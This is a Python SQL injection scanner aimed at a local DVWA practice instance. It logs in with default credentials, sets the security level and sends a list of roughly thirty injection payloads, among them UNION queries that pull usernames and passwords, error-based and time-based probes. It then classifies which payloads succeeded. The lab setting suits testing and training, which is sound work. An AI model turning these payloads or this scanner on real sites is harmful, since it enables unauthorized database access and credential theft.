import requests
from bs4 import BeautifulSoup
import sys

# Configuration
kali_ip = '127.0.0.1'
login_url = f"http://{kali_ip}/DVWA/login.php"
security_url = f"http://{kali_ip}/DVWA/security.php"
target_url = f"http://{kali_ip}/DVWA/vulnerabilities/sqli/"
session_input_url = f"http://{kali_ip}/DVWA/vulnerabilities/sqli/session-input.php"
payloads = [
    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 'a'='a", "' OR ''='", 
    "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*", "' OR 1=1 LIMIT 1 --", 
    "' OR 1=1 UNION SELECT NULL, NULL --", "' OR 1=1 UNION SELECT NULL, NULL, NULL --", 
    "admin'--", "admin'#", "admin'/*", "' UNION SELECT 1,2,3--", "' UNION SELECT NULL,NULL,NULL--", 
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "' UNION ALL SELECT NULL,NULL,NULL--", 
    "' UNION SELECT username, password FROM users--", "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--", 
    "' UNION SELECT 1,2,3,4,5,6-", "' AND 1=CONVERT(int, (SELECT @@version)) --", 
    "' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')) --", 
    "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT @@version))) --", 
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --", 
    "' UNION SELECT 1,2,3,@@version --", "'; WAITFOR DELAY '0:0:5'--", 
    "'; SLEEP(5)--", "'; WAITFOR DELAY '00:00:10'--", "'; BENCHMARK(1000000,MD5(1))--", 
    "' AND SLEEP(5)--", "' OR SLEEP(10)--", "' AND 1=BENCHMARK(5000000,MD5(1))--"
]
username = "admin"
password = "password"

# Step 2: Log in to the target site
def login(session, url, username, password):
    login_page = session.get(url)
    soup = BeautifulSoup(login_page.content, 'html.parser')
    form = soup.find('form')
    data = {}
    for input_tag in form.find_all('input'):
        if input_tag.get('name') == 'username':
            data[input_tag.get('name')] = username
        elif input_tag.get('name') == 'password':
            data[input_tag.get('name')] = password
        elif input_tag.get('name'):
            data[input_tag.get('name')] = input_tag.get('value')
    
    response = session.post(url, data=data)
    return response
    
# Step 2: Set security level
def set_security_level(session, url, level):
    security_page = session.get(url)
    soup = BeautifulSoup(security_page.content, 'html.parser')
    form = soup.find('form')
    data = {}
    for input_tag in form.find_all('input'):
        if input_tag.get('name') and input_tag.get('type') != 'submit':
            data[input_tag.get('name')] = input_tag.get('value')
    
    for select_tag in form.find_all('select'):
        data[select_tag.get('name')] = level
    
    for input_tag in form.find_all('input', {'type': 'submit'}):
        data[input_tag.get('name')] = input_tag.get('value')
    
    response = session.post(url, data=data)
    return response

# Step 3: Fetch Form Parameters
def fetch_form_params(session, url, security_level):
    response = session.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    form = soup.find('form')
    if not form:
        print("No form found on the page.")
        return {}
    params = {"id": ""} if security_level == "high" else {
        input_tag.get('name'): input_tag.get('value') for input_tag in form.find_all('input') if input_tag.get('name')
    }
    return params

# Step 4: Test Payloads
def test_payloads(session, payloads, params, security_level):
    results = []
    if security_level == "high":
        results = submit_payloads_via_session_form(session, payloads)
    else:
        for payload in payloads:
            for param in params.keys():
                original_value = params[param]
                params[param] = payload
                response = session.post(target_url, data=params) if security_level == "medium" else session.get(target_url, params=params)
                content = response.content.decode()
                if "You have an error in your SQL syntax" in content or "Warning: mysql_fetch_array()" in content:
                    classification = classify_payload(payload)
                    vulnerable_line = identify_vulnerable_line(security_level)
                    results.append((payload, param, classification, vulnerable_line))
                params[param] = original_value
    return results

# Step 5: Submit Payloads via Session Input Form (For High Security)
def submit_payloads_via_session_form(session, payloads):
    results = []
    for payload in payloads:
        data = {'id': payload, 'Submit': 'Submit'}
        session.post(session_input_url, data=data)
        response = session.get(target_url)
        content = response.content.decode()
        if "You have an error in your SQL syntax" in content or "Warning: mysql_fetch_array()" in content:
            classification = classify_payload(payload)
            vulnerable_line = identify_vulnerable_line("high")
            results.append((payload, 'id', classification, vulnerable_line))
        elif "First name:" in content:
            classification = classify_payload(payload)
            results.append((payload, 'id', classification, "Data output without error (potential vulnerability)."))
    return results

# Step 6: Classify Payloads
def classify_payload(payload):
    basic_sql_injection_patterns = ["' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 'a'='a", "' OR ''='"]
    error_based_patterns = ["CONVERT", "EXTRACTVALUE", "UTL_INADDR"]
    time_based_patterns = ["SLEEP", "BENCHMARK", "WAITFOR DELAY"]
    union_based_patterns = ["UNION SELECT"]

    # Check for Basic SQL Injection
    if any(pattern in payload for pattern in basic_sql_injection_patterns):
        return "Basic SQL Injection"
    
    # Check for Error-Based SQL Injection
    if any(pattern in payload for pattern in error_based_patterns):
        return "Error-Based SQL Injection"
    
    # Check for Time-Based SQL Injection
    if any(pattern in payload for pattern in time_based_patterns):
        return "Time-Based SQL Injection"
    
    # Check for Union-Based SQL Injection
    if any(pattern in payload for pattern in union_based_patterns):
        return "Union-Based SQL Injection"
    
    # If none match, return 'Unknown'
    return "Unknown"

# Step 7: Identify Vulnerable Line
def identify_vulnerable_line(security_level):
    if security_level == "low":
        return "$query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\";"
    elif security_level == "medium":
        return "$id = mysqli_real_escape_string($GLOBALS['___mysqli_ston'], $id);"
    elif security_level == "high":
        return "$query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;\";"
    else:  # For impossible
        return "None (testing all payloads to ensure no vulnerabilities)."

# Step 8: Print Results
def print_results(results, security_level):
    if not results:
        print(f"NO, the given URL is not vulnerable to SQL Injection at {security_level} security level.\n")
    else:
        print(f"YES, the given URL is vulnerable to SQL Injection at {security_level} security level.\n")
        
        # Collecting classifications by parameter
        param_results = {}
        for result in results:
            payload, param, classification, vulnerable_line = result
            if param not in param_results:
                param_results[param] = {"vulnerable_line": vulnerable_line, "classifications": {}}
            
            if classification not in param_results[param]["classifications"]:
                param_results[param]["classifications"][classification] = []
            
            param_results[param]["classifications"][classification].append(payload)
        
        for param, details in param_results.items():
            print(f"Vulnerable Parameter: {param}\nVulnerable Line of Code: {details['vulnerable_line']}\n")
            for classification, payload_list in details["classifications"].items():
                print(f"{classification}:")
                for payload in payload_list:
                    print(f"Payload: {payload}")
                print("-" * 80)

# Main Execution
def main():
    if len(sys.argv) < 2:
        print("Usage: python final_sqli1.py <security_level>")
        return
    
    security_level = sys.argv[1]
    
    with requests.Session() as session:
        login_response = login(session, login_url, username, password)
        if "Welcome" not in login_response.text:
            print("Login failed.")
            return
        
        set_security_level(session, security_url, security_level)
        
        params = fetch_form_params(session, target_url, security_level)
        if not params and security_level != "high":
            print("No parameters found to test.")
            return
        
        results = test_payloads(session, payloads, params, security_level)
        print_results(results, security_level)

if __name__ == "__main__":
    main()
